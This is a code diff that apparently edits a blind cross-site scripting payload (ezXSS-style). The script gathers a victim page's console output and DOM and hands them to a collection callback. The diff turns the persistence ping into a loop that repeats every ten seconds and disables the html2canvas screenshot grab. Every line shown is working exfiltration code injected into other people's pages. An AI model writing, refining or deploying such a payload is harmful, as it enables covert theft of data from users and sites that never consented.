@@ -1,18 +1,20 @@
-var pi;
 var last = '';
-var a = false;
+
 function ping() {
-    if(a===false) {
-        a=true;
-        try {
-            ez_rD.type = 'ping';
-            ez_rD.console = console.everything;
-            ez_cb(ez_rD, callback);
-            pi = setTimeout(ping, 10000);
-        } catch (e) {
-            init()
-        }
+    try {
+        ez_rD.type = 'ping';
+        ez_rD.console = console.everything;
+        ez_cb(ez_rD, callback);
+    } catch (e) {
     }
+}
+
+var intervalId = null;
+
+function startPing() {
+  if (intervalId === null) {
+    intervalId = window.setInterval(ping, 10000);
+  }
 }
 
 function callback(input) {
@@ -22,11 +24,12 @@ function callback(input) {
 function init() {
     // Ready to persist
     ra_hL();
-    ez_cb(ez_rD, ping);
+    ez_cb(ez_rD, startPing);
 }
 
 function ez_persist() {
     init();
+    ping();
 }
 
 
@@ -109,9 +112,10 @@ function ra_hL() {
         ez_rD.dom = ""
     }
     try {
-        html2canvas(document.body).then(function (e) {
-            ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
-        });
+        ez_rD.screenshot = "", ra_c()
+        //html2canvas(document.body).then(function (e) {
+        //    ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
+        //});
     } catch (e) {
         ez_rD.screenshot = "", ra_c()
     }
